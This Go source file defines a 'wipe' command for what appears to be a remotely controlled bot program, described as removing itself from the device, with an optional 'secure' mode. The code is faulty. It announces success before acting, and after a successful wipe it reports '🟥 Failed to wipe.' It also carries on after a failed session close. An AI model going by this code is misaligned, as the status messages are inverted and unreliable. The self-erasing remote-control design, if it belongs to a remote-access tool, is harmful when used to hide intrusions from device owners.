package commands

import (
	"fmt"
	"strings"

	"requiem/funcs"
	"requiem/store"
	"requiem/utils"
)

func (*WipeCommand) Exec(ctx *store.CommandContext, args []string) {
	initial, _ := ctx.ReplyMsg("🟩 Successfully wiped.")

	content := strings.Join(args, " ")
	secure := utils.HasFlag(content, "secure")

	err := ctx.Session.Close()
	if err != nil {
		ctx.EditMsg(initial.ID, fmt.Sprintf("🟥 Failed to close bot session - %s", err))
	}

	err = funcs.Wipe(secure)
	if err != nil {
		ctx.EditMsg(initial.ID, fmt.Sprintf("🟥 Failed to wipe - %s", err))
		return
	}

	ctx.EditMsg(initial.ID, "🟥 Failed to wipe.")
}

func (*WipeCommand) Name() string {
	return "wipe"
}

func (*WipeCommand) Info() string {
	return "Removes this from the device."
}

type WipeCommand struct{}
